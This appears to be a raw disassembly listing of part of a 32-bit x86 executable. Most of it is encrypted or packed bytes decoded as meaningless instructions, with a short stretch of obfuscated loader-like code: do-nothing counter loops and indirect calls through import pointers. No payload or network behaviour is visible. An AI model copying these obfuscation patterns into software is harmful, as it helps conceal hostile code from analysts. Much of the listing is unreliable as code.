  402fe7:	es mov cl,0x45
  402fea:	adc    al,0x43
  402fec:	adc    bl,BYTE PTR ds:0x4b5fcef2
  402ff2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402ff4:	call   DWORD PTR [esi+0x10]
  402ff7:	(bad)  
  402ff8:	inc    ecx
  402ff9:	add    al,0x62
  402ffb:	loop   0x403070
  402ffd:	(bad)  
  402ffe:	xor    dl,BYTE PTR [eax+0x2f]
  403001:	mov    al,0x2f
  403003:	jge    0x402fe6
  403005:	adc    esp,ebx
  403007:	rcl    esp,0x88
  40300a:	int3   
  40300b:	shl    ch,cl
  40300d:	ja     0x40308a
  40300f:	dec    eax
  403010:	inc    ebp
  403011:	test   DWORD PTR [edi-0x76],ebx
  403014:	(bad)  
  403015:	cli    
  403016:	enter  0xc50e,0xc5
  40301a:	and    BYTE PTR [edi-0x8937dc7],al
  403020:	aas    
  403021:	(bad)  
  403022:	enter  0x789d,0x63
  403026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403027:	xchg   BYTE PTR [edx],dl
  403029:	cli    
  40302a:	inc    esp
  40302b:	jg     0x40300e
  40302d:	pushf  
  40302e:	lea    ebp,fs:[edi]
  403031:	or     esp,DWORD PTR [edi+esi*8-0x3c780c23]
  403038:	push   edx
  403039:	ja     0x403078
  40303b:	xchg   esp,eax
  40303c:	jns    0x402fbe
  40303e:	mov    ch,0xca
  403040:	mov    al,0x7c
  403042:	aas    
  403043:	or     BYTE PTR [eax-0x7b],0x4b
  403047:	idiv   DWORD PTR ds:0xb1ea656d
  40304d:	mov    ecx,0xd9edaf75
  403052:	jge    0x402fe3
  403054:	mov    edx,0x10389d98
  403059:	or     DWORD PTR [ebx],0xf1212a89
  40305f:	jle    0x4030b7
  403061:	push   edx
  403062:	add    ebx,DWORD PTR [esi+0x30]
  403065:	or     al,0x95
  403067:	mov    ds:0xb3f1329b,eax
  40306c:	adc    eax,0xa02cbfda
  403071:	and    al,0xa7
  403073:	mov    ds:0x27dee520,al
  403078:	and    al,0xa3
  40307a:	add    DWORD PTR [ebp+0x5a],esp
  40307d:	cs push esp
  40307f:	cmp    ah,BYTE PTR [eax+0x1c6604b4]
  403085:	and    eax,0x3e611fe6
  40308a:	test   DWORD PTR [ebx-0x1d],esi
  40308d:	push   ebp
  40308e:	pop    esp
  40308f:	xchg   edx,eax
  403090:	add    ah,BYTE PTR [ebx-0x6b765ec1]
  403096:	fst    DWORD PTR [esi+0x37]
  403099:	sbb    BYTE PTR [ebp+0x744c65e1],0xd1
  4030a0:	outs   dx,DWORD PTR cs:[esi]
  4030a2:	and    al,0xf3
  4030a5:	or     dl,cl
  4030a7:	sub    bl,BYTE PTR [esi-0x10]
  4030aa:	mov    esi,0x412be5f5
  4030af:	mov    esi,0x5b51cc00
  4030b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b5:	daa    
  4030b6:	lods   al,BYTE PTR ds:[esi]
  4030b7:	aad    0x34
  4030b9:	mov    BYTE PTR [edi-0x7d],cl
  4030bc:	jnp    0x4030df
  4030be:	jl     0x4030dd
  4030c0:	and    al,0x86
  4030c2:	sbb    BYTE PTR [ebp-0xb2b8288],cl
  4030c8:	ror    BYTE PTR [esp+ecx*1+0x9],cl
  4030cc:	fst    st(3)
  4030ce:	jecxz  0x40314a
  4030d0:	add    BYTE PTR [eax-0x56],ah
  4030d3:	jns    0x403081
  4030d5:	add    eax,0xc8548689
  4030da:	xchg   DWORD PTR [edi],ebx
  4030dc:	jge    0x4030a1
  4030de:	dec    ebx
  4030df:	xor    BYTE PTR [ebx-0x78],bh
  4030e2:	pop    ds
  4030e3:	(bad)  
  4030e4:	push   ebp
  4030e5:	in     eax,dx
  4030e6:	repnz cmc 
  4030e8:	jo     0x40311c
  4030ea:	sbb    al,0xe8
  4030ed:	push   esp
  4030ee:	addr16 repz push edi
  4030f1:	sbb    al,0x22
  4030f3:	inc    esi
  4030f4:	cld    
  4030f5:	shl    cl,0xe1
  4030f8:	lock push edx
  4030fa:	sub    eax,esi
  4030fc:	sbb    al,0xb9
  4030fe:	dec    edx
  4030ff:	mov    dh,0xc9
  403101:	inc    ebp
  403102:	(bad)
  403105:	inc    ecx
  403106:	and    DWORD PTR [eax-0x74a621c],eax
  40310c:	rcl    dh,cl
  40310e:	inc    BYTE PTR [edi-0x79f76cd9]
  403114:	bound  ebx,QWORD PTR [eax-0x6158f8b6]
  40311a:	sub    ebp,DWORD PTR [eax+0x1d3d0de1]
  403120:	pop    ebp
  403121:	call   DWORD PTR [ebp-0x5ecfa0b2]
  403127:	ret    
  403128:	(bad)  
  403129:	adc    eax,0x2d
  40312c:	dec    ebx
  40312d:	nop
  40312e:	jg     0x40316a
  403130:	xchg   ecx,eax
  403131:	add    al,0x50
  403133:	add    DWORD PTR [ebx],edi
  403135:	mov    al,0x14
  403137:	ss xchg ecx,eax
  403139:	mov    ?,WORD PTR [ecx+eiz*8+0x77]
  40313d:	adc    ecx,DWORD PTR [edi+0x1c]
  403140:	push   esi
  403141:	adc    bl,BYTE PTR [edi+0x24797121]
  403147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403148:	icebp  
  403149:	ret    0x866a
  40314c:	loope  0x4031c1
  40314e:	cdq    
  40314f:	xchg   esi,eax
  403150:	ret    0x2546
  403153:	sub    bl,cl
  403155:	mov    esp,0xa35ad5b6
  40315a:	je     0x4030e1
  40315c:	pop    esp
  40315d:	out    dx,al
  40315e:	dec    edi
  40315f:	mov    esp,DWORD PTR [ecx]
  403161:	adc    cl,cl
  403163:	test   eax,0xd8ef39a0
  403168:	(bad)  
  403169:	aam    0x4d
  40316b:	add    eax,0xafc74a98
  403170:	or     edi,ecx
  403172:	sub    cl,BYTE PTR [esi]
  403174:	loopne 0x40318a
  403176:	dec    edi
  403177:	jae    0x40318b
  403179:	adc    al,0x17
  40317b:	cmp    bl,BYTE PTR ds:0xf0c019ae
  403181:	push   ebp
  403182:	adc    al,BYTE PTR [ecx+0x7687e087]
  403188:	(bad)
  40318b:	aam    0x20
  40318d:	xchg   esp,eax
  40318e:	sub    esi,DWORD PTR [ecx+0x5a]
  403191:	aam    0x54
  403193:	jae    0x40316d
  403195:	fld    TBYTE PTR ds:0x35005ba
  40319b:	nop
  40319c:	xchg   edx,eax
  40319d:	arpl   ax,si
  40319f:	iret   
  4031a0:	out    dx,al
  4031a1:	sbb    BYTE PTR [ecx-0x775cc95f],0xe0
  4031a8:	pop    ebx
  4031a9:	addr16 mov bh,0xf3
  4031ac:	or     eax,0x42bcb400
  4031b1:	push   esp
  4031b2:	dec    eax
  4031b3:	scas   eax,DWORD PTR es:[edi]
  4031b4:	jnp    0x4031f7
  4031b6:	pop    ecx
  4031b7:	(bad)  
  4031b8:	retf   0x3ebb
  4031bb:	nop
  4031bc:	or     DWORD PTR [ebp+0x3b],0xc455ee50
  4031c3:	pop    edi
  4031c4:	push   0x598fe089
  4031c9:	(bad)  [edx*8-0x7daebef0]
  4031d0:	ror    DWORD PTR [edi-0x62a90ca9],0x10
  4031d7:	xor    al,0x1f
  4031d9:	(bad)  
  4031da:	xchg   esi,eax
  4031db:	mov    ebp,0xebf3634d
  4031e0:	ret    
  4031e1:	cdq    
  4031e2:	or     BYTE PTR [eax-0x69e6e617],al
  4031e8:	outs   dx,DWORD PTR ds:[esi]
  4031e9:	cli    
  4031ea:	jecxz  0x403250
  4031ec:	repnz popf 
  4031ee:	inc    ebx
  4031ef:	jmp    0x403186
  4031f1:	xchg   esi,eax
  4031f2:	mov    gs,WORD PTR [edi-0x76]
  4031f5:	lea    ebx,[esi-0x58]
  4031f8:	sbb    ecx,0xd6135d18
  4031fe:	push   ebp
  4031ff:	imul   ebx,ebp,0xffffff9e
  403202:	(bad)  
  403203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403204:	outs   dx,BYTE PTR ds:[esi]
  403205:	sbb    DWORD PTR [ecx+0x39f5f709],ebx
  40320b:	sbb    BYTE PTR [ecx+0x3f],dl
  40320e:	(bad)  
  40320f:	loope  0x4031e9
  403211:	dec    ebp
  403212:	mov    bl,0x99
  403214:	das    
  403215:	inc    edx
  403216:	add    al,0x46
  403218:	adc    al,0x85
  40321a:	mov    ds:0x162795dd,eax
  40321f:	call   0xf4f4a92e
  403224:	or     eax,0xc7c288a3
  403229:	aas    
  40322a:	in     al,dx
  40322b:	ror    al,1
  40322d:	jb     0x4031ff
  40322f:	mov    esp,0xeb2655c4
  403234:	jne    0x4031bc
  403236:	cdq    
  403237:	mov    al,BYTE PTR [eax]
  403239:	pop    ebp
  40323a:	int3   
  40323b:	mov    edx,0xeee4288c
  403240:	push   eax
  403241:	scas   eax,DWORD PTR es:[edi]
  403242:	mov    ch,0x66
  403244:	inc    edx
  403245:	inc    eax
  403246:	inc    ebp
  403247:	sbb    BYTE PTR [ebp-0x6110f6e4],bl
  40324d:	lods   al,BYTE PTR ds:[esi]
  40324e:	test   DWORD PTR [edi+0x39b8b5ac],esi
  403254:	sub    al,0x15
  403256:	xor    al,0x54
  403258:	jg     0x40329c
  40325a:	mov    esi,ecx
  40325c:	cmc    
  40325d:	push   edi
  40325e:	scas   eax,DWORD PTR es:[edi]
  40325f:	jno    0x4032b7
  403261:	xchg   ebp,eax
  403262:	ficom  WORD PTR [eax-0x78358e57]
  403268:	dec    ebx
  403269:	gs cmc 
  40326b:	es jb  0x403221
  40326e:	sti    
  40326f:	fldcw  WORD PTR [edx]
  403271:	mov    BYTE PTR [edi-0x47],bh
  403274:	test   BYTE PTR [edx],bh
  403276:	or     eax,esi
  403278:	pop    es
  403279:	int    0xd
  40327b:	call   0x5b0f:0x20cb238d
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433697,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433697
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433697,edx
  4032b3:	cmp    DWORD PTR ds:0x433697,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x43376d
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433697,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433697
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433697,edx
  4032ef:	cmp    DWORD PTR ds:0x433697,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43361b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x4336db,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x433673,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x433673
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x433673,ecx
  403332:	cmp    DWORD PTR ds:0x433673,0x1f
  403339:	jne    0x403361
  40333f:	push   0x4336d7
  403344:	push   0x4336a3
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x43384c
  403351:	push   0x43374a
  403356:	push   0x4337e7
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x433673,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x4335db,0x1f
  403378:	cmp    DWORD PTR ds:0x4335db,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x4335db,0x4
  40338c:	jne    0x40339d
  403392:	push   0x43366b
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x4335db,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x4335db
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x4335db,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x4335db
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x4335db,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x433663,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x4336ab,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x43365b,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	push   ebp
  403412:	enter  0x5a66,0x16
  403416:	adc    edi,DWORD PTR [esp+edi*2+0x6d]
  40341a:	jg     0x403498
  40341c:	jl     0x40348b
  40341e:	ds mov edx,0x28253b9d
  403424:	pop    ebx
  403425:	mov    ch,0x4a
  403427:	dec    edi
  403428:	xor    eax,DWORD PTR [edi]
  40342a:	adc    DWORD PTR [eax+0x39],esp
  40342d:	dec    esp
  40342e:	mov    esi,0x26dcd3fd
  403433:	xchg   ebp,eax
  403434:	repz xor BYTE PTR [ecx+ebp*2-0x80],ah
  403439:	xor    al,0x91
  40343b:	push   ebp
  40343c:	jg     0x4033f6
  40343e:	mov    ds:0x9d517d3,al
  403443:	add    DWORD PTR [ebx],edx
  403445:	ja     0x4034c3
  403447:	test   DWORD PTR [edi+0x7f5105f9],ebp
  40344d:	mov    ch,0x7
  40344f:	stc    
  403450:	(bad)  
  403451:	fs xor al,0xc2
  403454:	sti    
  403455:	mov    edi,0x62732857
  40345a:	xchg   ebx,eax
  40345b:	adc    dl,BYTE PTR [edx-0x539954f0]
  403461:	jmp    0x44b3:0x3da66479
  403468:	dec    ebx
  403469:	out    dx,eax
  40346a:	in     eax,0x0
  40346c:	data16 cmc 
  40346e:	mov    BYTE PTR [ecx],cl
  403470:	mov    WORD PTR [ebx-0x2b93a0d],?
  403476:	jmp    0xd80f:0xe273627b
  40347d:	in     al,dx
  40347e:	or     bh,cl
  403480:	mov    bh,0xe7
  403482:	pop    ebp
  403483:	scas   eax,DWORD PTR es:[edi]
  403484:	ins    BYTE PTR es:[edi],dx
  403485:	cdq    
  403486:	add    BYTE PTR [esi],bl
  403488:	fs jo  0x40341b
  40348b:	inc    edx
  40348c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40348d:	je     0x403431
  40348f:	out    0x98,al
  403491:	shl    DWORD PTR [ebx-0x75],cl
  403494:	cmp    edi,eax
  403496:	xchg   DWORD PTR [edi+0x41],ebx
  403499:	outs   dx,DWORD PTR ds:[esi]
  40349a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40349b:	adc    BYTE PTR [esi+0x48],al
  40349e:	aas    
  40349f:	repnz test al,0x11
  4034a2:	jle    0x403506
  4034a4:	int3   
  4034a5:	pop    es
  4034a6:	aam    0x7c
  4034a8:	and    esp,ebx
  4034aa:	leave  
  4034ab:	xor    DWORD PTR [edx-0x1ca3c26a],ebp
  4034b1:	pop    ss
  4034b2:	lea    ebx,[edx-0x4dd4e8ef]
  4034b8:	lahf   
  4034b9:	inc    ebx
  4034ba:	jne    0x4034b0
  4034bc:	mov    eax,ds:0xe3b1201e
  4034c1:	inc    ebx
  4034c2:	and    eax,0x66044b2a
  4034c7:	xor    eax,0x2b03f2d2
  4034cc:	jl     0x403527
  4034ce:	ins    BYTE PTR es:[edi],dx
  4034cf:	and    DWORD PTR [edi],eax
  4034d1:	cli    
  4034d2:	sub    ebx,DWORD PTR [edi-0x76]
  4034d5:	xlat   BYTE PTR ds:[ebx]
  4034d6:	cmp    al,0x33
  4034d8:	in     al,dx
  4034d9:	adc    BYTE PTR ds:[esp+edi*2+0x10154b55],0xe1
  4034e2:	push   ss
  4034e3:	stos   BYTE PTR es:[edi],al
  4034e4:	push   ss
  4034e5:	mov    cl,0xd8
  4034e7:	pop    ss
  4034e8:	inc    esp
  4034e9:	mov    esp,0xabdc3da3
  4034ee:	push   0xffffff83
  4034f0:	pop    ds
  4034f1:	inc    ecx
  4034f2:	xchg   edi,eax
  4034f3:	in     eax,0x95
  4034f5:	inc    edx
  4034f6:	xor    al,0x17
  4034f8:	mul    BYTE PTR [ebp+0x143f6bfc]
  4034fe:	shl    DWORD PTR [esi],1
  403500:	cmc    
  403501:	ret    0x720e
  403504:	stos   DWORD PTR es:[edi],eax
  403505:	cdq    
  403506:	mov    edi,0xd34a39e6
  40350b:	and    esi,DWORD PTR [edx]
  40350d:	mov    ecx,0x7f685096
  403512:	push   0xffffffb6
  403514:	(bad)  
  403515:	pop    ebp
  403516:	dec    ebx
  403517:	dec    ebp
  403518:	mov    dh,0xac
  40351a:	push   0x7edb1003
  40351f:	xchg   ebx,eax
  403520:	jns    0x40359d
  403522:	or     DWORD PTR [edi],eax
  403524:	ja     0x4034f9
  403526:	jae    0x40358a
  403528:	ins    DWORD PTR es:[edi],dx
  403529:	popf   
  40352a:	mov    esp,0x563f669a
  40352f:	shr    BYTE PTR [edx],cl
  403531:	jne    0x40358e
  403533:	add    eax,0x12446884
  403538:	push   ss
  403539:	push   cs
  40353a:	test   ebx,ebx
  40353c:	dec    BYTE PTR [ebp+0x4329665c]
  403542:	xor    edx,DWORD PTR [ecx-0x8]
  403545:	and    ah,BYTE PTR [edx+0x59c4268b]
  40354b:	mov    ah,0xa0
  40354d:	dec    sp
  40354f:	enter  0x815b,0x1c
  403553:	sar    BYTE PTR [ecx+0x307d86fe],cl
  403559:	data16 cli 
  40355b:	mov    cl,0xb2
  40355d:	pop    edx
  40355e:	or     ebx,0x3ddf4c29
  403564:	mov    esp,0x2ab77570
  403569:	lea    edx,[eax+0x505cc365]
  40356f:	scas   eax,DWORD PTR es:[edi]
  403570:	shr    DWORD PTR [edi+0x2a],1
  403573:	es in  al,dx
  403575:	mov    esi,0x3d59b30e
  40357a:	clc    
  40357b:	xchg   edx,eax
  40357c:	fs xchg esp,ebp
  40357f:	or     ch,0xb7
  403582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403583:	outs   dx,DWORD PTR ds:[esi]
  403584:	les    edi,FWORD PTR [edi-0x1c]
  403587:	aam    0xa5
  403589:	xchg   esp,eax
  40358a:	std    
  40358b:	sahf   
  40358c:	cmp    edx,DWORD PTR [eax-0x68]
  40358f:	sub    al,0x30
  403591:	jp     0x4035e5
  403593:	outs   dx,DWORD PTR ds:[esi]
  403594:	dec    ebx
  403595:	jmp    0x9f6d:0xebeff0f
  40359c:	cmp    DWORD PTR [ecx+0x26],0xffffffdf
  4035a0:	gs pop ds
  4035a2:	jo     0x4035a5
  4035a4:	lods   al,BYTE PTR ds:[esi]
  4035a5:	inc    ebp
  4035a6:	fs pusha 
  4035a8:	xchg   edx,eax
  4035a9:	test   eax,0x25cdfb16
  4035ae:	xchg   BYTE PTR [ecx],bh
  4035b0:	mov    BYTE PTR [edi-0xd],0xeb
  4035b4:	imul   ebp,DWORD PTR [esi+0x4bcfc44f],0x25
  4035bb:	dec    esp
  4035bc:	(bad)
  4035c0:	out    dx,eax
  4035c1:	cmp    edi,DWORD PTR [ebx-0x2f]
  4035c4:	xchg   BYTE PTR [eax-0x4428a6c0],al
  4035ca:	sub    ebp,DWORD PTR [edi]
  4035cc:	and    eax,0x64728671
  4035d1:	or     eax,DWORD PTR [esi-0x15]
  4035d4:	push   edx
  4035d5:	aam    0x75
  4035d7:	in     al,dx
  4035d8:	mov    ds:0xe4c735cb,al
  4035dd:	cmp    eax,0xf50ae245
  4035e2:	gs mov ebp,0x7f4f236f
  4035e8:	(bad)  
  4035ea:	and    BYTE PTR [edi-0xf],al
  4035ed:	dec    ecx
  4035ee:	pop    esi
  4035ef:	adc    eax,ebp
  4035f1:	xor    BYTE PTR [ebx+0x1c],dl
  4035f4:	xchg   ebx,eax
  4035f5:	mov    edi,0x7e1f2c9
  4035fa:	and    ebx,DWORD PTR [ecx-0x4b]
  4035fd:	and    cl,BYTE PTR ds:0x4cfebe1c
  403603:	cmp    BYTE PTR [esi],al
  403605:	jle    0x403621
  403607:	jge    0x40359b
  403609:	push   ebx
  40360a:	adc    DWORD PTR [eax-0x75],esp
  40360d:	push   ebp
  40360e:	clc    
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0xeb942f76
  403649:	mov    bh,0x7
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	and    DWORD PTR [edx],ecx
  403654:	push   ebp
  403655:	mov    ebp,0x34c7b5e
  40365a:	cmp    dh,BYTE PTR [edi-0x438360db]
  403660:	adc    ax,0xa8d5
  403664:	mov    eax,0x9f96d985
  403669:	push   esp
  40366a:	dec    esi
  40366b:	push   cs
  40366c:	xchg   edi,eax
  40366d:	(bad)
  403670:	stos   DWORD PTR es:[edi],eax
  403671:	add    ebp,DWORD PTR [edx+0x40cf5ffe]
  403677:	mov    cl,0x65
  403679:	pop    ebp
  40367a:	repz rcr BYTE PTR [edx],cl
  40367d:	mov    ebx,DWORD PTR [esi]
  40367f:	jnp    0x403617
  403681:	fmulp  st(3),st
  403683:	pushf  
  403684:	or     eax,0x989ddf36
  403689:	in     al,0xd0
  40368b:	push   edi
  40368c:	mov    bl,0x19
  40368e:	imul   edi,DWORD PTR [edi+eiz*4-0x3ada25e9],0x2c0f4d1a
  403699:	lea    ebp,[edx]
  40369b:	mov    edi,0x5ba61491
  4036a0:	push   es
  4036a1:	sub    esp,DWORD PTR ds:0x9c5fb5f4
  4036a7:	nop
  4036a8:	lods   eax,DWORD PTR ds:[esi]
  4036a9:	lea    esi,[ebp+0x779f8994]
  4036af:	stc    
  4036b0:	dec    DWORD PTR [edi-0x66]
  4036b3:	jmp    0x403683
  4036b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b6:	loop   0x40365a
  4036b8:	adc    al,0x50
  4036ba:	in     al,0xbc
  4036bc:	jge    0x403717
  4036be:	stos   DWORD PTR es:[edi],eax
  4036bf:	shr    BYTE PTR [eax],0x58
  4036c2:	xchg   ecx,eax
  4036c3:	cwde   
  4036c4:	bound  esp,QWORD PTR ds:0xeb2c16d2
  4036ca:	rcr    DWORD PTR [ebp+0xd],cl
  4036cd:	inc    eax
  4036ce:	or     al,0xc8
  4036d0:	int3   
  4036d1:	lods   eax,DWORD PTR ds:[esi]
  4036d2:	xor    BYTE PTR [edi+0x6b],0xc6
  4036d6:	loop   0x403735
  4036d8:	dec    ebx
  4036d9:	xchg   ebx,eax
  4036da:	xchg   edi,eax
  4036db:	test   eax,0x2af024f9
  4036e0:	push   esp
  4036e1:	push   es
  4036e2:	sbb    BYTE PTR gs:[ebx+0x7d],ah
  4036e6:	pop    ebx
  4036e7:	sub    DWORD PTR [edx-0x7decd605],0x7e41a30b
  4036f1:	sub    ch,BYTE PTR [ecx+0x2b]
  4036f4:	mov    es,WORD PTR [ecx]
  4036f6:	pop    esp
  4036f7:	out    dx,eax
  4036f8:	rcr    BYTE PTR ss:[eax+0x45165ac],cl
  4036ff:	adc    DWORD PTR [edi-0x62],esp
  403702:	pop    esp
  403703:	lahf   
  403704:	cwde   
  403705:	in     eax,0x29
  403707:	and    bl,BYTE PTR [edx-0x25c2c595]
  40370d:	ins    BYTE PTR es:[edi],dx
  40370e:	xchg   edx,eax
  40370f:	sar    BYTE PTR [esi-0x1bc50635],0xca
  403716:	adc    cl,bh
  403718:	push   ebx
  403719:	xchg   edi,eax
  40371a:	mov    ebp,DWORD PTR [eax-0x3]
  40371d:	and    bl,BYTE PTR ds:0x2a2628aa
  403723:	lahf   
  403724:	pusha  
  403725:	pop    es
  403726:	mov    ah,0x2e
  403728:	movhps QWORD PTR [ebp+0x120049f4],xmm7
  40372f:	aas    
  403730:	(bad)  
  403731:	lds    edx,FWORD PTR [ecx]
  403733:	(bad)  
  403734:	gs nop
  403736:	pop    esp
  403737:	adc    cl,BYTE PTR [edi+edi*2-0x27245e6e]
  40373e:	add    al,0xff
  403740:	sub    al,0x7
  403742:	mov    edi,0x2b942ba3
  403747:	xchg   ebp,eax
  403748:	add    BYTE PTR [edx+0x6e6cc3ae],0xb8
  40374f:	or     cl,cl
  403751:	ja     0x4036d8
  403753:	stos   DWORD PTR es:[edi],eax
  403754:	mov    esi,eax
  403756:	or     BYTE PTR [esi],ah
  403758:	aad    0x6a
  40375a:	add    BYTE PTR [ebp+edi*8-0x77],ah
  40375e:	lods   eax,DWORD PTR ds:[esi]
  40375f:	sub    DWORD PTR [edi+edi*4-0x40],eax
  403763:	bound  ecx,QWORD PTR [eax+0x5ceaebf]
  403769:	xchg   ebp,eax
  40376a:	cmp    eax,0xcd336555
  40376f:	sahf   
  403770:	(bad)  
  403772:	aam    0x71
  403774:	mov    dl,0xda
  403776:	pop    ds
  403777:	ds ja  0x403753
  40377a:	and    esp,edi
  40377c:	in     eax,dx
  40377d:	adc    eax,0xe1e66a75
  403782:	xchg   DWORD PTR [ebx-0x4e7c7316],edx
  403788:	cmp    bp,bp
  40378b:	jecxz  0x403752
  40378d:	mov    ?,WORD PTR [edi-0x42]
  403790:	mov    ds:0x279bd40b,eax
  403795:	shl    DWORD PTR [ebx+0x45],cl
  403798:	sbb    cl,0x33
  40379b:	add    al,0xaa
  40379d:	mov    esi,0x6e41a55b
  4037a2:	iret   
  4037a3:	arpl   WORD PTR [ecx+0x21339620],sp
  4037a9:	add    esi,DWORD PTR [ecx+0x2f7b37da]
  4037af:	and    edi,edx
  4037b1:	outs   dx,DWORD PTR ds:[esi]
  4037b2:	sub    ch,bh
  4037b4:	jnp    0x403771
  4037b6:	push   ebp
  4037b7:	sbb    DWORD PTR [ecx-0x13b974ad],eax
  4037bd:	std    
  4037be:	jb     0x40382f
  4037c0:	push   edx
  4037c1:	push   ebp
  4037c2:	fs jns 0x4037f9
  4037c5:	stc    
  4037c6:	mov    cl,0x66
  4037c8:	shr    BYTE PTR [ecx+0x21],0x8a
  4037cc:	cmc    
  4037cd:	and    esp,esp
  4037cf:	test   eax,0x5ec999fe
  4037d4:	out    0x16,eax
  4037d6:	pop    eax
  4037d7:	inc    esp
  4037d8:	cs push edi
  4037da:	les    eax,FWORD PTR [edi+0x35b639f]
  4037e0:	inc    ecx
  4037e1:	(bad)  
  4037e2:	in     eax,0xcd
  4037e4:	jb     0x4037e6
  4037e6:	xchg   esi,eax
  4037e7:	fs dec cx
  4037ea:	cmp    DWORD PTR [edx],eax
  4037ec:	fwait
  4037ed:	clc    
  4037ee:	aas    
  4037ef:	popa   
  4037f0:	xor    BYTE PTR [esi+0x7f91c815],dh
  4037f6:	jmp    0xa772:0x7e4f7c2c
  4037fd:	push   edx
  4037fe:	and    al,0xed
  403800:	pop    es
  403801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403802:	xor    DWORD PTR ds:0xbb9b5257,ebx
  403808:	leave  
  403809:	mov    dl,0xb2
  40380b:	loopne 0x403821
  40380d:	sbb    eax,0x8f3f0ed2
  403812:	mov    ecx,0xcd500ae4
  403817:	and    al,0xe4
  403819:	mov    WORD PTR [eax],ss
  40381b:	cdq    
  40381c:	cmp    esp,DWORD PTR gs:[eax]
  40381f:	mov    al,ds:0x4b1ed192
  403824:	lahf   
  403825:	cwde   
  403826:	popf   
  403827:	push   0xa04bca9
  40382c:	push   0xffffffb2
  40382e:	pop    edi
  403830:	ins    BYTE PTR es:[edi],dx
  403831:	jae    0x40385f
  403833:	dec    esp
  403835:	test   DWORD PTR [esi+0x72c54619],0xfa52908b
  40383f:	call   0x7e9:0xf8458b6c
  403846:	add    al,BYTE PTR [eax]
  403848:	add    al,dl
  40384a:	mov    esi,0x5d5dd03b
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	mov    esi,0x743237c0
  40385a:	sbb    al,0x7c
  40385c:	jl     0x4038cb
  40385e:	jg     0x4038dc
  403860:	jl     0x40385b
  403862:	add    al,0x72
  403864:	les    eax,FWORD PTR ss:[edx]
  403867:	mov    bh,0xa
  403869:	push   edi
  40386a:	(bad)  
  40386b:	cli    
  40386c:	dec    ebp
  40386d:	pop    edi
  40386e:	push   esp
  40386f:	outs   dx,BYTE PTR ds:[esi]
  403870:	push   esi
  403871:	xchg   esp,eax
  403872:	mov    eax,0x98c2196c
  403877:	pusha  
  403878:	stos   DWORD PTR es:[edi],eax
  403879:	out    dx,al
  40387a:	push   esi
  40387b:	xchg   DWORD PTR [edx],edx
  40387d:	call   0xbe3f:0xfeff560e
  403884:	push   ecx
  403885:	pop    ebx
  403886:	outs   dx,BYTE PTR ds:[esi]
  403887:	call   0x252b:0x2eaf1c8
  40388e:	ss mov cl,0x39
